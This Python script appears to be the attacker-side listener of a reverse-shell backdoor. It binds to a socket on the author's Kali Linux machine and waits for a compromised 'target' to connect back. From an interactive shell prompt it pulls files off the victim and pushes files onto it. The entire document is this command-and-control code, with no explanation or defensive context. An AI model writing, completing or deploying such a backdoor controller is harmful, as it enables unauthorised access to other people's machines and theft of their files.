import os
import socket
import json

SERVER_IP = '192.168.254.49'  # IP of my Kali Linux machine
SERVER_PORT = 5555

def reliable_send(data):
    json_data = json.dumps(data)
    target_sock.send(json_data.encode())

def reliable_recv():
    data = ''
    while True:
        try:
            data = data + target_sock.recv(1024).decode().rstrip()
            return json.loads(data)
        except ValueError:
            continue

def upload_file(filename):
    file = open(filename, 'rb')
    target_sock.send(file.read())
    file.close()

def download_file(filename):
    file = open(filename, 'wb')
    target_sock.settimeout(1)
    chunk = target_sock.recv(1024)
    while chunk:
        file.write(chunk)
        try:
            chunk = target_sock.recv(1024)
        except socket.timeout:
            break
    target_sock.settimeout(None)
    file.close()

def target_communication():
    while True:
        command = input(f'* Shell~{str(target_ip)}: ')
        if command[:9] == 'download ':
            reliable_send(command)
            download_file(command[9:])
        elif command[:7] == 'upload ':
            args = command.split(' -d ')
            if len(args) > 1:
                command = f"upload {args[0]} -d {args[1]}"
            reliable_send(command)
            upload_file(args[0])
        else:
            break

server_sock = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
server_sock.bind((SERVER_IP, SERVER_PORT))

print('[+] Listening For Incoming Connections')
server_sock.listen(5)
target_sock, target_ip = server_sock.accept()
print(f'[+] Target Connected From: {str(target_ip)}')

target_communication()
server_sock.close()
